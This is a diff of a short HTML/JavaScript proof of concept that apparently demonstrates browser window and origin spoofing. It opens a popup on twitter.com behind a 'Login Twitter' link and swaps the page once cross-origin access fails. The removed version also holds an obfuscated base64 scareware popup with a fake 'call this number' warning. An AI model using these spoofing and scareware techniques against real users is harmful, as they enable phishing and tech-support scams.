@@ -1,27 +1,15 @@
 
-<body>
-<button onclick=foo()>go</button>
-</body>
-
 <script>
+  function next() {
+         w.location.replace('https://www.google.com:1234');
+        }
 
-var w;
-var t;
-function foo(){
-
-w = setTimeout('document.location = "http:/www.google.com:9090"',2000)
-t = setInterval('bar()',1);
-}
-
-function bar(){
-try{
-w.location.href;
-}
-catch(e){
-clearInterval(t);
-setTimeout("document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSy5cbkNBTEw6IDgwMC0xMTEtMjIyMiIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));test()",1000);
-}
-
-}
-
+  function f() {
+    w = window.open("");
+    w.document.write('<h2>This is not twitter.com!</h2>');
+    w.location = "https://twitter.com";
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
 </script>
+
+<a href="#" onclick="f()">Login Twitter</a>
